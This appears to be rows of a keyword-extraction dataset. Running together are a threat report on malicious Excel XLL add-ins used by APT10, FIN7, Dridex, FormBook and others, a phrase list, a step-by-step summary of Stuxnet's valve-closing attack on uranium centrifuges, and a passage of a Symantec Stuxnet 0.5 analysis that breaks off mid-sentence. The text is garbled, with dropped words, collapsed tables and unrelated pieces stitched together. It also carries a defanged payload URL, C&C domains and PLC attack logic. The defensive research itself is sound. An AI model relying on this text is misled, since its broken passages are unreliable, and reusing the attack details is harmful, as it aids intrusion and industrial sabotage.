malicious add-ins, specifically XLL files. Although XLL files were supported since early versions of Excel, including Excel 97, malicious actors started using it relatively recently. Currently, a significant number of advanced persistent threat actors and commodity malware families are using XLLs as an infection vector and this number continues to grow.For decades, Microsoft Office applications have served as one of the most significant entry points for malicious code. Malicious actors have continued to utilize Visual Basic for Applications (VBA) macros, despite automatic warnings to users after opening Office documents containing code.In addition to VBA macros, malicious actors, from cybercrime actors to state-sponsored groups, also exploited vulnerabilities in Office applications in order to launch malicious code without user intervention.1/18Over the years, ever since the first VBA malware was discovered at the end of the century, the cybersecurity community have been vocal in calling on Microsoft to introduce default behavior that will block execution of VBA macros if a document was downloaded or received from the internet.Finally, this year in July, Microsoft started rolling out versions of Office applications which will block execution of any VBA macros by default. The Office applications now go through a decision making process that is much stricter than before and do not even offer the user a possibility to run macros when a document has a so called Mark Of The Web (MOTW) tag, an alternate data stream that indicates a file has been downloaded from the internet.Logic used to block or allow macros in Microsoft Office applicationsMicrosoft Office is the most popular office application package used by a large number of corporate and home users with many versions, licensed and unlicensed, still in use worldwide. Although the change to block macros and not allow their execution through the Office application user interface will be a significant factor in the future, it will take a long time until old versions of Office–still capable of executing macros–are phased out.Even if malicious actors continue targeting VBA macros in older Office versions, more and more high profile targets will start using new versions which will prevent attacks using documents containing VBA code.Unfortunately, it would be naive to assume that Office will stop being targeted, now that VBA macros have been blocked. The purpose of this research is to identify other means of introducing third party code into Office applications which, perhaps, are already being used by malware authors. Microsoft Office and add-insIndeed, a whole class of code can be introduced as so-called Office add-ins. Add-ins are simply pieces of executable code, in various formats and capabilities, that can be added to Office applications in order to enhance the application’s appearance or functionality. Add-ins may come in a form of specific Office documents containing VBA code or modules containing compiled functionality, whether the compiled functionality is contained in .NET bytecode (VSTO plugins), in a form of COM servers or in a form of dynamic loading libraries (DLL) renamed with a specific filename extension.For Word, the add-ins need to be dropped in a specific location specified by the registry value HKCU\Software\Microsoft\Office\16.0\Word\Security\Trusted Locations, depending on the Office version.2/18If an attacker is able to place a DLL into a trusted location using the filename extension .wll, Word will attempt to load the DLL into its own process space.For Excel, the default behavior is a bit different. If the user attempts to open a file with the filename extension .XLL in Windows Explorer, the shell will automatically attempt to launch Excel to open the .XLL file. This is because .XLL is the default filename extension for a specific class of Excel add-ins.Before an XLL file is loaded, Excel displays a warning about the possibility of malicious code being included. This is a similar approach as the message about potentially dangerous code which is displayed after an Office document containing VBA macro code is opened. Unfortunately, this protection technique is often ineffective as a protection against the malicious code as many users tend to disregard the warning.Excel warning about a potential risk of opening an XLL fileXLL files can be sent by email, and even with the usual anti-malware scanning measures, users may be able to open them not knowing that they may contain malicious code.In order to automatically launch code, malicious actors using Office documents would implement one or more event handling functions such as AutoOpen, AutoClose, Document_Open and Document_Close for Word or Worbook_Open, Workbook_Close, Auto_Open, Auto_Close for Excel.Those functions would be called when a document is opened, closed or when the Office application fired an event handled by one of the implemented functions.Using auto start functions, the attackers are able to launch their malicious macro code. The question for a researcher would be, is there any similar functionality in add-ins, which can be used in a similar way? Is there a function an attacker may be able to implement to launch code when an add-in file is opened? The answer to these questions is yes, and the answer specifically relates to XLL plugins.This is already known to malicious actors who have been using XLL files in the past. The intent of this research is to show whether attackers have transitioned from using malicious VBA macros to using XLLs3/18as the infection vector, specifically after Microsoft’s announcement about blocking VBA macros. What are XLL filesIn terms of the file type, XLL files are just standard Windows dynamic loading libraries (DLLs). The difference between a regular DLL and an XLL file is that XLLs can implement certain exported functions which will be called by the Excel Add-In manager during some events triggered by the Excel application.As for functionality, add-ins created in native code allows developers to extend Excel functionality and create user defined functions (UDFs) which would be able to execute calculations and other activities in native speed.C/C++ based XLLsNative XLL add-ins are developed using the Microsoft Excel XLL software development kit (SDK). The latest version of SDK is released for Office 2013 but it can also be used to develop XLL add-ins for newer Office versions.In order for an XLL add-in to be successfully loaded by the add-in manager, the XLL has to implement at least one exported function, called xlAutoOpen, in order for the add-in code to be called when the add-in is loaded by Excel.XLL exports and the events when they are calledThe Excel XLL SDK consists of C/C++ header files and libraries that allow XLL files to utilize the Excel API to access workbooks data and call Excel functions. The API is based on the old Excel 4 macro API. A file named macrofun.hlp in the old Windows help file format is still available in some repositories but there is also an Excel 4 Macro Reference PDF file created by Mynda Treacy which can help to understand the API.Most of the observed XLL malware samples are not created with the functionality to access Excel API but rather to execute its malicious code when the Excel Add-In manager calls xlAutoOpen or xlAutoClose functions.4/18Excel-DNA based XLLsAlthough XLLs are meant to be native DLLs, the development in older compiled languages may not be familiar to many developers, especially as .NET became the de facto standard for developing user-based applications on Windows.Perhaps that is why there are a couple of projects that allow developers to create XLL add-ins using .NET languages such as C# or VB.NET. The two most popular frameworks are Add-In Express and Excel- DNA.In particular, since it is free, malware authors have adopted Excel-DNA as one of the common tools for creating malicious XLL files. An XLL file written in a .NET language is compiled in a standalone file containing shim functions which map native exports to the CLR functions contained in a user-defined assembly DLL embedded in the resource section of the file generated by Excel-DNA.An Excel-DNA example: 8KWKF is a user-defined .NET assembly embedded within the resource sectionTogether with the user-defined assembly DLL, the resource section of the Excel-DNA generated add-in may contain a number of DLLs used to translate the native function calls into .NET function calls and vice-versa.For example, the EXCELDNA.LOADER assembly is tasked with loading the .NET framework and connecting it with the user-defined DLL.Excel-DNA requires the developer to instantiate an interface IExcelAddIn which will be called by the Excel-DNA loader. The developer may then implement a class that will inherit from IExcelAddIn and define functions to overload the default implementations of functions that map to the functions automatically called by Excel. For example, xlAutoOpen function is mapped to IExcelAddIn.AutoOpen(). Evolution of malicious XLLs Hunting for XLLs in VirusTotalArmed with the knowledge of what XLL files are, it will not be very difficult to search for the malicious files using the VirusTotal interface as well as internal sample repositories. On VirusTotal, the basic way to5/18search for malicious native XLL files submitted for the first time, for example, in November is: exports:xlAutoOpen positives:5+ fs:2022-11-01+Perhaps also including XLLs that implement xlAutoClose: exports:xlAutoClose positives 5+ fs:2022-11-01+For Excel-DNA files, the situation is somewhat different. Because an Excel-DNA compiled file is a shim, it contains over 10,000 exports. Not all of the exports will be indexed by VirusTotal, which include all the xlAuto functions. This means that the standard search for xlAutoOpen export will not yield any Excel-DNA files in the search result. To search for Excel-DNA XLLs we can search for exported function names that only appear in Excel-DNA compiled DLLs, for example: exports:CalculationCanceled exports:SyncMacro fs:2022-11-01+The searches can easily be converted into YARA rules for hunting: and uint16(0) == 0x5a4d and pe.characteristics & pe.DLL and pe.exports(""xlAutoOpen"") and positives > 3 }for native XLL files, and and uint16(0) == 0x5a4d and pe.characteristics & pe.DLL and pe.exports(""CalculationCanceled"") and pe.exports(""SyncMacro"") and positives > 3 }for Excel-DNA based malicious XLLs.6/18Using the search capabilities, we are able to track the number of submitted native and Excel-DNA based malicious files over time, on a monthly basis.Monthly submissions of native malicious XLL files from Jan 2021.Monthly submissions of Excel-DNA compiled malicious XLL files from Jan 2021.Our search on VirusTotal has shown that malicious actors were well aware of the existence of XLL files and were using them way before Microsoft decided to start blocking documents containing VBA macros.We decided to conduct an extensive search for XLL samples in order to create a timeline to see when exactly the first malicious XLLs started to appear, as well as to understand which groups and malware families were using them over time.We started our search targeting samples first submitted from the beginning of 2010. Although there were around 20 XLLs submitted in 2010, we could not classify any of them conclusively as malicious. In fact,no was submitted. In the same month, a Meterpreter reverse shell sample, executing malicious code. For quite some time after that, the usage of XLL files is only sporadic and it does not increase significantly until the end of 2021, when commodity malware families such as Dridex and Formbook started using it. Notable actors and malware families using XLLs APT10 (menuPass, Chessmaster, Potassium)APT10 is a threat group originating in China with specific interest in the education, manufacturing and pharmaceutical sectors. The group is known to target organizations in Japan and other countries. It has to VirusTotal in December 2017 and it contains functionality to inject the Backdoor Anel payload into the process space of svchost.exe. APT10 operators are known to exclusively use this backdoor.8/18Anel Backdoor injectorTA410TA410 is a cyberespionage umbrella group loosely linked to APT10, known mostly for targeting US- based organizations in the utilities sector, and diplomatic organizations in the Middle East and Africa. TA410 has been active since at least 2018 and was first publicly revealed in August 2019 by Proofpoint.ESET researchers have written an extensive analysis of the toolkit employed by TA410, which also includes an XLL stage discovered in 2020. One of the components in the attack, a process injection DLL named onkeytoken_keb.dll xlAutoOpen export, although no malicious functionality is executed when calling it (the injector is triggered by calling the exported function OnKeyT_ContextInit).DonotThe DoNot team is known for targeting Kashmiri non-profit organizations and Pakistani government officials. The region of Kashmir is under ongoing disputes from India, China and Pakistan about its ownership. The DoNot team has used mobile implants as well as some custom desktop payloads that get installed onto systems through malicious documents.On October 7th 2022, a DLL uploaded from a user in Pakistan. The DLL contains two exports. The first export's name is pdteong, which has been seen in Donot implants since at least June of this year.The second export name is xlAutoOpen, which makes the implant a fully functional, native-based XLL payload.FIN7FIN7 is a financially-motivated threat group operating from Russia. FIN7 is using a number of payloads and different infection techniques, including .NET assemblies and PowerShell. The main goal of FIN7 is obtaining financial gain for the group. FIN7 most commonly uses Carbanak malware.Earlier this year, FIN7 started using XLLs sent as attachments in malicious email campaigns. For example, the XLL file from a February campaign was 40127.xll”. The file serves as a downloader for the next stage.The FIN7 XLL downloaders are interesting as they appear to have been created with the Excel-DNA .NET framework. On closer inspection, we observe that the files are modified Excel-DNA shim libraries, with their xlAutoOpen functions changed from the original to include code that will connect to an attacker controlled host to download additional components.9/18Modified FIN7 Excel-DNA shim downloader connects to an attacker controlled hostCommodity malware familiesDridex downloaderDridex downloaders, such as major peak in the number of XLL files submitted to VirusTotal in late 2021. This XLL is a simple, natively compiled library which chooses the payload location from a large list of possible payloads posted to and publicly accessible from Discord.10/18A Dridex XLL downloaderFormBook downloaderThe second most commonly seen payload towards the end of 2021, when the commodity malware families caught up with more advanced actors, is FormBook. FormBook is an inexpensive stealer available as ""malware-as-a-service”. FormBook samples are able to record keystrokes, steal passwords (stored locally and in web forms) and can take screenshots.The XLL Formbook downloader, masquerading as an invoice sent from a company to the user. When the user opens the attached XLL file, the malicious downloader is launched. The downloader is rather simple and it enumerates the resource section of the file in a search for a specific string resource which contains the URL of the FormBook payload.11/18FormBook finds the resource “f” which contains the payload URLOther notable commodity malware families that use XLLs as the infection vector and are not specifically described in this post include AgentTesla, Ransomware Stop, Vidar, Buer Loader, Nanocore, IceID, Arkei, AsyncRat, BazarLoader and others. Recent interesting XLL based malware campaignsWarzone (Avemaria) RATIn August 2022, the hunt for malicious XLLs based on the Excel-DNA framework yielded an email targeted to Hungarian users. The email pretends to be an official communication from the Hungarian police containing the text“We are the VII Budapest District Police Department.We have heard about the excellence of your company. Our center needs your quote for our 2022 budget (attached). The budget is co-financed by the Ministry of the Interior of our Hungarian government. Please submit your offer by August 25, 2022. Please find the attachment and let us know if you need more information.”12/18A Warzone campaign email exampleThe attachment is a .NET based XLL file, payload from the URL hxxp[:]//172[.]245[.]120[.]8/pdfreader[.]exe. At the time of analysis, the URL hosted and later hosted samples of AgentTesla and Lokibot.Warzone (AgentTesla, Lokibot) downloader implemented in .NET using Excel-DNADucktail downloaderDucktail is an information stealer malware targeting users in the digital advertising sector, attributed to a threat actor operating in Vietnam. Ducktail attempts to steal browser stored credentials and cookies with the specific intent to steal the details of Facebook friends and business contacts. Ducktail is known to use13/18social engineering and contact potential victims using LinkedIn and Whatsapp messages. The threat actor uses their gained access to run ads for monetary gain.The second stage of the Ducktail downloader is stored as AES encrypted Base32 encoded blobThe Ducktail stealer payload is shared using large (over 100 MB) compressed archives containing a number of legitimate resources as well as malicious files. In mid-September, we detected the file Project Marketing Plan and Facebook Google Ads Results Report.xll”.The Base32 encoded blob is decoded and loaded using reflectionThe file is created using Excel-DNA and contains a Base32 encoded and encrypted data blob which gets loaded into the process space of Explorer using reflection.Once decoded, the function Timer is called, which drops and opens a legitimate Excel workbook containing fake results of online advertising campaigns. The endpoint then downloads and runs the14/18Ducktail stealer payload from a publicly accessible Discord URL.The downloader drops a lure Excel workbook and downloads the Ducktail payload from Discord SummaryAs a result of Microsoft’s decision to prevent execution of VBA macro code contained in documents downloaded from the Internet, we will likely see a gradual decline in the number of newly discovered malicious documents. However, it will take some time before all users will be able to benefit from that change since there is a significant number of older versions of Microsoft Office still in circulation that support running VBA from downloaded files.For up to date versions, actors are capable of using other formats to launch malicious code using Office applications. In this post, we documented a specific class of malicious Excel add-ins, so called XLL files, and tracked their evolution from early usage until today.15/18Timeline of major XLL developments from 2013 to 2022Even if XLL add-ins existed for some time, we were not able to detect their usage by malicious actors until mid-2017 when some APT groups started using them to implement a fully functional backdoor. We also identified that their usage significantly increased over the last two years as more commodity malware families adopted XLLs as their infection vector.As more and more users adopt new versions of Microsoft Office, it is likely that threat actors will turn away from VBA-based malicious documents to other formats such as XLLs or rely on exploiting newly discovered vulnerabilities to launch malicious code in the process space of Office applications. Talos will continue to track malicious XLL files and report on their development whenever new interesting activity is detected or when an important threat actor group adopts them as a part of the attacker’s playbook.CoverageWays our customers can detect and block this threat are listed below.16/18Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the execution of the malware detailed in this post. Try Secure Endpoint for free here.Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by threat actors as part of their campaign. You can try Secure Email for free here.Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances such as Threat Defense Virtual, Adaptive Security Appliance and Meraki MX can detect malicious activity associated with this threat.Cisco Secure Network/Cloud Analytics (Stealthwatch/Stealthwatch Cloud) analyzes network traffic automatically and alerts users of potentially unwanted activity on every connected device.Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds protection into all Cisco Secure products.Umbrella, Cisco’s secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. Sign up for a free trial of Umbrella here.Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks potentially dangerous sites and tests suspicious sites before users access them.Additional protections with context to your specific environment and threat data are available from the Firewall Management Center.Cisco Duo provides multi-factor authentication for users to ensure only those authorized are accessing your network.Open-source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org.The following Snort SIDs are applicable to this threat: 60979-60981The following ClamAV signatures are applicable to this threat:Win.Trojan.MSShellcode-7 Win.Dropper.Generickdz-9908391-0 Win.Trojan.MaliciousXLL-9980293-0 Win.Malware.Donot-9980303-0 Win.Trojan.Warzone-9980507-0 Win.Trojan.TA410-9980506-0 Win.Malware.Generic-9980501-017/18Win.Malware.Cerbu-9980304-0 Win.Malware.Zusy-9980503-0 Win.Trojan.FIN7-9980508-0 Win.Malware.Koobick-9980509-0 Win.Trojan.Ducktail-9980510-0 Win.Malware.Koobick-9980511-0Orbital QueriesCisco Secure Endpoint users can use Orbital Advanced Search to run complex OSqueries to see if their endpoints are infected with this specific threat. For specific OSqueries related to this threat, please follow the links:url Talos/osquery_queries/blob/master/win_malware/malware_avemaria_filepath.yaml IOCsIndicators of Compromise associated with this threat can be found here.18/18 ","{'phrases': ['The attacker', 'a framework', 'Excel-DNA', 'the XLL', 'exports', 'code', 'an XLL file', 'an invoice', 'report', 'the email', 'the attached XLL file', 'a warning', 'xlAutoOpen export', 'payloads', 'the malware', 'connects', '10'], 'target': 'The attacker; a framework; Excel-DNA; the XLL; exports; code; an XLL file; an invoice; report; the email; the attached XLL file; a warning; xlAutoOpen export; payloads; the malware; connects; 10.'}"
"the attacker; the worm; the system; control; servers; the worm; infected computers; July 4, 2009; the attacker; initial access; the worm; 0; detection.","['1. Infects victim\'s system through compromised Siemens Step 7 project files. 2. Fingerprints the PLC system by parsing human designated symbol labels for devices. 3. Identifies the target is a Siemens 417 PLC controlling uranium enrichment centrifuges. 4. Constructs a special data block DB8061 to conduct the attack. 5. Monitors for the ""DOWNLOAD"" command to rebuild DB8061 if needed. 6. Enters attack states when enrichment process is at steady state for over 30 days. 7. Begins replaying normal sensor input signals to hide changes. 8. Closes valves controlling UF6 gas flow to centrifuges in cascades. 9. Opens valves to get low pressure sensor reading from attacked cascade. 10. Waits for pressure buildup before proceeding. 11. Further opens valves to maximize pressure. 12. Waits several minutes while preventing any state changes. 13. Resets PLC attack code to return to normal monitoring. ']","Extract the keywords: Stuxnet 0.5: The Missing LinkGeoff McDonald, Liam O Murchu, Stephen Doherty, Eric ChienVersion 1.0: February 26, 2013Contents Overview 1 Installation and load point 3 Replication 3 Command-and-control 4 Payload 5 Man-in-the-Middle 5 Fingerprinting and building DB8061 6 PLC device attack code 9 Conclusion 12 Appendix A 13 Appendix B 14 Appendix C 15 Appendix D 16 Resources 17 Community credits 17Overview In 2010, Symantec reported on a new and highly sophisticated worm called Stuxnet. This worm became known as the first computer software threat that was used as a cyber-weapon. The worm was specifically designed to take control over industrial plant machinery and making them operate outside of their safe or normal performance envelope, causing damage in the process. This was a first in the history of malware.Clues in the code pointed to other versions of the worm which could potentially perform different actions leaving an open question about Stuxnet and how it came to be. The wait for the missing link is now over. Symantec have now discovered an older version of Stuxnet that can answer the questions about the evolution of Stuxnet. This newly discovered variant has been dissected and analyzed in detail and here is a summary of our key findings:• Stuxnet 0.5 is the oldest known Stuxnet version to be analyzed, inthe wild as early as November 2007 and in development as early as November 2005.• Stuxnet 0.5 was less aggressive than Stuxnet versions 1.x and onlyspread through infected Step 7 projects.• Stuxnet 0.5 contains an alternative attack strategy, closing valveswithin the uranium enrichment facility at Natanz, Iran, which would have caused serious damage to the centrifuges and uranium enrichment system as a whole.Whether Stuxnet 0.5 was successful is unclear, but later versions of Stuxnet were developed using a different development framework, became more aggressive, and employed a different attack strategy that changed the speeds of the centrifuges instead instead suggesting Stuxnet 0.5 did not completely fulfill the attacker’s goals.More versions of Stuxnet are known to exist, but have never been recovered.Table 1Evolution of Stuxnet versions November 3, 2005Description C&C server registrationNovember 15, 2007Submit date to a public scanning serviceJuly 4, 2009June 22, 2009March 1, 2010April 14, 2010June 24, 2012Infection stop dateMain binary compile timestampMain binary compile timestampMain binary compile timestampInfection stop dateEvolution0.500Stuxnet 0.5 was submitted to a malware scanning service in November 2007 and could have began operation as early as November 2005. This version is designed to stop compromising computers on July 4, 2009, and stop communicating with its command-and-control (C&C) servers on an earlier date of January 11 that same year. The compile timestamps found within most of the code appear unreliable and generally are in the range of the year 2001.0.5001.0011.1001.1011.xTable 2Evolution of Stuxnet exploits Vulnerability CVE-2010-38880.5001.001CVE-2010-2743CVE-2010-2729CVE-2008-4250CVE-2012-3015CVE-2010-2772CVE-2010-2568MS09-025XXXXXXBased on an internal version number this version of Stuxnet is 0.5, the earliest known version of the Stuxnet family.The only method of replication in Stuxnet 0.5 is through infection of Siemens Step 7 project files. Stuxnet 0.5 does not exploit any Microsoft vulnerabilities, unlike versions 1.x which came later.There are differences in exploited vulnerabilities and spreading mechanisms between Stuxnet versions.1.1001.101XXXXXXXXXXXXXXDescription Task scheduler EOPLoadKeyboardLayout EOPPrint spooler RCEWindows Server Service RPC RCEStep 7 Insecure Library LoadingWinCC default passwordShortcut .lnk RCENtUserRegisterClassExWow/NtUserMessageCall EOPTable 3Evolution of Stuxnet replication Replication Technique Step 7 project filesX0.500 1.001 1.100 1.101USB through Step 7 project filesXUSB through AutorunUSB through CVE-2010-2568Network sharesWindows Server RPCPrinter spoolerWinCC serversPeer-to-peer updating through mailslotsXPeer-to-peer updating through RPCXXXXXXXXXXXXXXXXXXXXXPage 2Stuxnet 0.5 is partly based on the Flamer platform whereas 1.x versions were based primarily on the Tilded platform. Over time, the developers appear to have migrated more towards the Tilded platform. The developers actually re-implemented Flamer-platform components using the Tilded platform in later versions.Both the Flamer and Tilded platform code bases are different enough to suggest different developers were involved.Stuxnet 0.5 also contains code to attack the valve systems in a uranium enrichment facility rather than modifying centrifuge speeds, as in versions 1.x of Stuxnet.Installation and load pointStuxnet 0.5 arrives as an infected Step 7 project archive containing both the s7hkimdb.dll and XR000001.MDX files. Using the Multiple Siemens SIMATIC Products DLL Loading Arbitrary Code Execution Vulnerability (CVE- 2012-3015), the S7hkimdb.dll file is executed, which then decrypts and injects the main XR00001.MDX Stuxnet binary file into the services.exe process. Stuxnet is now executing on the system.Once injected into the services.exe process, a copy of the main Stuxnet binary and a companion DLL that implements the payload are saved to disk in encrypted form along with a MRXCLS.SYS load point driver. The main Stuxnet binary refers to itself as outbreak.dll and is saved to disk as oem7a.pnf. The companion DLL that implements the payload refers to itself as installation.dll and saved to disk as oem7w.pnf. When the system is booted, the MRXCLS.SYS load point driver will decrypt configuration data stored in the registry, decrypt the main Stuxnet binary, and inject it into the Explorer and Step 7 processes. The payload DLL will be decrypted as well and injected into the Explorer process. When loading dynamic-link library (DLL) resources, Stuxnet makes use of a module that mimics LoadLibrary rather than calling LoadLibrary itself. This technique is likely used to avoid security software and was not seen in versions 1.x of Stuxnet.A second driver, PCIBUS.SYS, is also created which causes a forced reboot by generating a BSoD (Blue Screen of Death) 20 days after installation.A third driver, USBACC11.SYS, is then installed. This driver is similar to the MRXCLS.SYS driver, but instead decrypts and injects DLLs for peer-to-peer and C&C communication into the svchost.exe and Internet Explorer processes.The structure and organization as well as resource and export listings of each component is available in Appendix D.Stuxnet 0.5 also checks the current date in a variety of code paths and will not continue to spread after July 4, 2009. Certain modules may also not be created or loaded if security software is present. A list is available in Appendix B.A variety of additional files are created, including log files and configuration files. A list is available in Appendix A.ReplicationStuxnet 0.5 uses one form of replication through Step 7 project archives. When a removable drive is inserted in an infected system, Stuxnet 0.5 will infect any Step 7 project archives with a .s7p or .zip file name extension on the drive. In addition, Step 7 project archives on the local disk will also be infected.Therefore Stuxnet 0.5 spreads to additional machines through removable drives or through human-initiated sharing of infected Step 7 project archives, for example through email.Stuxnet 0.5 infects Step 7 project archives in the same manner as Stuxnet 1.x versions (as described in W32.Page 3Stuxnet Dossier, Step 7 Project File Infections). The following is an example file listing of an infected Step 7 project file. ApiLog/Types – modified to trigger DLL loading vulnerability XUTILS/links/S7P00001.DBF – configuration file XUTILS/listen/S7000001.MDX – payload DLL (installation.dll) XUTILS/listen/XR000000.MDX – main Stuxnet binary (outbreak.dll) hOmSave7/subfolder/s7hkimdb.dll - loaderCommand-and-controlSimilar to Stuxnet 1.x versions, Stuxnet 0.5 has limited command-and-control ability. In particular, Stuxnet 0.5 does not provide fine grained control to its authors. Instead, Stuxnet 0.5 can only download new code and update itself. Stuxnet needs to ultimately spread on isolated networks with no Internet access, therefore it has been designed to be autonomous to reduce the need for robust and fine grained command-and-control. Stuxnet 0.5 also uses a secondary peer-to-peer mechanism to propagate these code updates to peers on networks inaccessible to the broader Internet.Command-and-control is implemented by the inetpsp.dll file while peer-to-peer communications are implemented by the netsimp32.dll file. Both files are loaded by the usbacc11.sys driver and then injected into the svchost.exe and iexplore.exe processes.Stuxnet 0.5 has four C&C servers, all of which are now either unavailable or have since been registered by an • best-advertising.net • internetadvertising4u.com • ad-marketing.net Interestingly, Stuxnet 0.5 is programmed to stop contacting the C&C server after January 11, 2009, even though the threat is programmed to only stop spreading after a later date of July 4, 2009.Figure 1Internet advertising agency homepage for Stuxnet C&C serversThe C&C server domains were created in 2005 and all displayed the same front page purporting to be an Internet advertising agency named Media Suffix (figure 1) with the tag line “Believe What the Mind Can Dream”.The servers were hosted on commercial hosting providers in the United States, Canada, France, and Thailand. The fact that these domains were in operation since 2005, suggests that the Stuxnet project started more than seven years ago.Page 4The first request by Stuxnet 0.5 uses the following form:url notifies the C&C server of an active successful infection. Next, Stuxnet 0.5 sends the following request:url may download and execute a file if an update is available.The final target network for Stuxnet 0.5 was likely isolated from the Internet. To allow updates to reach these machines, Stuxnet 0.5 also used a peer-to-peer mechanism. As long as one updated version was introduced into this network—for example through an infected USB key—all the other infected machines on the network could receive updates or new code modules.Stuxnet 0.5 uses Windows mailslots for peer-to-peer communication. Mailslots allow a process to pass a message to another process on a remote machine. Stuxnet 0.5 enumerates all machines on the network and attempts to connect to a mailslot named \\[REMOTE MACHINE NAME]\mailslot\svchost. It then provides a callback mailslot name of \\[LOCAL MACHINE NAME]\mailslot\imnotify. Stuxnet 0.5 uses these mailslots for peer-to-peer communication and to pass code updates. In addition, Stuxnet 0.5 may configure systems to allow anonymous logins and then provides the following file shares:• temp$ • WebFiles$This allows file retrieval by peer infections. Shared files include: %WinDir%\msagent\agentsb.dll %WinDir%\msagent\intl\agt0f2e.dll %WinDir%\system32\complnd.dll %WinDir%\system32\dllcache\datacprs.dll %WinDir%\system32\wbem\perfnws.dll %WinDir%\Installer\{6F716D8C-398F-11D3-85E1-005004838609}\places.datPayloadMan-in-the-MiddleIn order to both fingerprint the target system and inject malicious Programmable Logic Controller (PLC) code, Stuxnet 0.5 replaces two Step 7 DLLs in order to hijack communications with a PLC.The first DLL, s7otbxdx.dll, is hijacked in order to insert the malicious PLC code. The same technique was used in Stuxnet versions 1.x (as described in W32.Stuxnet Dossier, Modifying PLCs). Stuxnet 0.5 hooks fewer exports and verifies the CPU is a 417 PLC rather than a 315 PLC, otherwise the behavior remains generally the same.The second DLL, s7aaapix.dll, is used for fingerprinting the target system and building DB8061, a PLC data block needed to conduct the attack. The export AUTDoVerb is hijacked and the malicious s7otbxdx.dll file can call the export with magic values (0x91E55A3D, 0x996AB716, 0x4A5CBB03) in order to build or provide a previously built DB8061 data block for injection. Stuxnet hijacks AUTDoVerb in order to monitor any “DOWNLOAD” verb actions, which signifies the fingerprinting and building of DB8061 must occur again in order to ensure the target system is still correctly configured.Page 5Fingerprinting and building DB8061 The building of the DB8061 block is a complicated and lengthy process.Through the hijacked export, Stuxnet 0.5 will receive a pointer to the most recently used block (PLC programs consist of code and data blocks). Stuxnet 0.5 will then traverse the project structure in order to find the symbols used by the S7 Program in the active project. Symbols are human designated labels representing each device controlled by the PLC. The symbol labels loosely follow the ANSI/ISA S5.1 Instrumentation Symbols and Identification standard used in Piping and Instrumentation Diagrams (P&ID).Stuxnet 0.5 uses these labels for both fingerprinting and determining the addresses of each device in order to modify the behavior of those devices.Table 4Stuxnet 0.5 hooks fewer exports Stuxnet v0.500 Stuxnet v1.xxx s7_events7_events7ag_bub_cycl_read_creates7ag_bub_read_vars7ag_bub_read_var_segs7ag_bub_write_vars7ag_bub_write_var_segs7ag_read_szls7ag_tests7blk_deletes7blk_findfirsts7blk_findnexts7ag_link_ins7ag_read_szls7ag_tests7blk_deletes7blk_findfirsts7blk_findnextSymbol label parsing The target system must be a SIMATIC 400 Station (0x14109A) or SIMATIC H-Station (0x141342), which use 417 PLCs. The symbol labels must match the format: <delimiter><FunctionIdentifier><delimiter><C ascadeModule><delimiter><CascadeNumber><Dev iceNumber> A valve in module A21, also in cascade 8, and associated with centrifuge 160, would have the symbol label PV- A21-8-160, for example.s7blk_writes7blk_writes7db_closes7db_opens7blk_reads7blk_reads7db_openEach field is defined as follows:Delimiter Either space (“ “), hyphen (“-”), underscore (“_”), or not present at all.FunctionIdentifer A string that matches a set of strings (available in Appendix C) that loosely follows the ANSI/ISA S5.1 Instrumentation Symbols and Identification standard. If the string is “PIA” (Pressure Indicator Alarm), it is expected to be followed by a one digit number. These strings will represent the device type (a valve, a transducer, or a status light, for instance).CascadeModule Must be the string “A21” to “A28” inclusive. These strings match cascade modules in Natanz, Iran, seen publicly described as “A24”, “A26”, and “A28”.CascadeNumber Single character that is in the letter range A to R. If it is not in this letter range, it checks to see if it is two digits in the decimal range 00 to 18. This two digit number is the number representation of the letter for A to R.Page 6DeviceNumber This is parsed in a more complex fashion depending on the device type as determined by the function identifier and caters to three possible cascade arrangements. The device type mappings to function identifiers are available in Appendix C.Device type 0 A string of digits: If the length of the digits is less than three, the device type is changed to device type 6. If the length of the digits is greater than or equal to three, the device type is changed to device type 7.Device type 1, 2, 3 “##”: A two digit number in the range 1 to 25.Device type 4, 5, or 7 Device type 4, 5, or 7 has three different formats:Format 1 “####”: Decoded as two separate two-digit numbers representing the stage number and the centrifuge number within the stage, respectively. The stage number must be in the decimal range 1 to 15, which matches with the known Natanz configuration. For each of these 15 stages, the maximum number of expected centrifuges in each corresponding stage is looked up in the following array.Table 5Stage numbers with expected numbers of centrifuges requirement is consistent with the centrifuge arrangement within a cascade.Format 2 “###”: A three digit number that must be less than 164, which is the number of centrifuges in a cascade.Format 3 “##L”: A two digit number followed by a letter. The letter must be in the range A to D, and the number must be in the decimal range 1 to 43. This arrangement sub-divides each stage into sub-clusters of four.Device type 6 “##”: A two digit number in the range 1 to 30.Device type 8, 9, B, or C “##”: A two digit number in the range 1 to 3.Page 7Device type A “##<delimiter><string>”: A two digit number in the range 1 to 3 with an optional string preceded by a delimiter character. The string must start with the letter S and contain the letter P. If the string is present, the device is modified to be device type 0xB instead (Flow Rate Transmitter Controller Output, rather than device type 0xA which is Flow Rate Transmitter Controller Input).Based on the symbol fingerprinting, the following table summarizes what devices and labels Stuxnet looks for within the symbol table.Table 6Summary of Stuxnet symbol label parsingDevice typeP&ID function identifierAuxiliary valveCentrifuge valve{HS, HV, PV, EP}, {ZLO,ZO},{ZLC,ZC}{MVS, RVS, VS}, {MV,RV,SV,YV}Stage pressure transducerPT, PCV, PIA#, PIT, PIC, PI, PSCentrifuge pressure transducerPT, PCV, PIA#, PIT, PIC, PI, PSFlow rate sensor{FIA}, {FIT}, {FITC},FIC,FT,MFC,MFM}Devices per cascadeMin 2163300Max 25164301643Symbol address parsing Each symbol label will have two corresponding addresses: -- the address in the process image area and the direct peripheral address of the device represented by the symbol. Modifying the memory at these addresses allows the PLC to control and read the behavior of the associated device. For example, the value may be a Boolean value turning a switch on or off, or a 16-bit value representing the current temperature of the system. Addresses can be either outputs (the PLC sets the value to modify the behavior of the device) or inputs (the PLC reads the value to determine the current state of the device).Device types 0, 1, 5, and B must be output addresses and device types 2, 3, 4, 5, 6, 7, 8, 9, A, and C must be input addresses.Values at addresses for device types 0, 1, 2, 3, 4, and 5 must be bit values. Values at addresses for device types 6, 7, 8, 9, A, B, and C must be 16-bit values.Cascade rating and building DB8061 After parsing the symbols and addresses for each cascade, the code inspects the configuration of each 